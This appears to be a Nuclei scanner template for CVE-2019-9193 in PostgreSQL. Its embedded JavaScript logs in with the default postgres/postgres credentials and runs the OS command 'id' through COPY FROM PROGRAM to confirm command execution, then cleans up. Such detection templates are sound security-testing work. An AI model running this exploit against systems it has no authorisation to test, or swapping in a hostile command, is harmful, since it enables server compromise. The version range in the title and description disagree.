id: CVE-2019-9193
info:
  author: pussycat0x
  classification:
    epss-percentile: 0.99821
    epss-score: 0.93587
  description: "In PostgreSQL 9.3 through 11.2, the \"COPY TO/FROM PROGRAM\" function\
    \ allows superusers and users in the 'pg_execute_server_program' group to execute\
    \ arbitrary code in the context of the database's operating system user. This\
    \ functionality is enabled by default and can be abused to run arbitrary operating\
    \ system commands on Windows, Linux, and macOS. NOTE: Third parties claim/state\
    \ this is not an issue because PostgreSQL functionality for \u2018COPY TO/FROM\
    \ PROGRAM\u2019 is acting as intended. References state that in PostgreSQL, a\
    \ superuser can execute commands as the server user without using the \u2018COPY\
    \ FROM PROGRAM\u2019.\n"
  impact: 'Authenticated superusers can execute arbitrary operating system commands
    through the COPY TO/FROM PROGRAM function, potentially achieving complete server
    compromise.

    '
  metadata:
    max-request: 1
    shodan-query: product:"PostgreSQL"
    verified: true
  name: PostgreSQL 9.3-12.3 Authenticated Remote Code Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2019-9193
  remediation: 'Restrict access to superuser and pg_execute_server_program privileges,
    or disable the COPY TO/FROM PROGRAM functionality if not required.

    '
  severity: high
  tags: cve,cve2018,js,network,postgresql,intrusive,vkev,vuln
javascript:
- args:
    Db: '{{database}}'
    Host: '{{Host}}'
    Pass: '{{password}}'
    Port: 5432
    User: '{{usernames}}'
    tbl_exec: '{{randbase(5)}}'
  attack: clusterbomb
  code: "const postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\n\
    const tbl = tbl_exec\nconst qry = [\"CREATE TABLE \"+tbl+\"(cmd_output text);\"\
    , \"COPY \"+tbl + \" FROM PROGRAM 'id';\", \"SELECT * FROM \"+ tbl+\";\", \"DROP\
    \ TABLE IF EXISTS \" +tbl+\";\",];\nfor (const x of qry){\n  connected =  client.ExecuteQuery(Host,\
    \ Port, User, Pass, Db, x);\n  Export(connected);\n}\n"
  matchers:
  - regex:
    - ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)
    type: regex
  - type: word
    words:
    - cmd_output
  matchers-condition: and
  payloads:
    database:
    - postgres
    password:
    - postgres
    usernames:
    - postgres
  pre-condition: 'isPortOpen(Host,Port);

    '
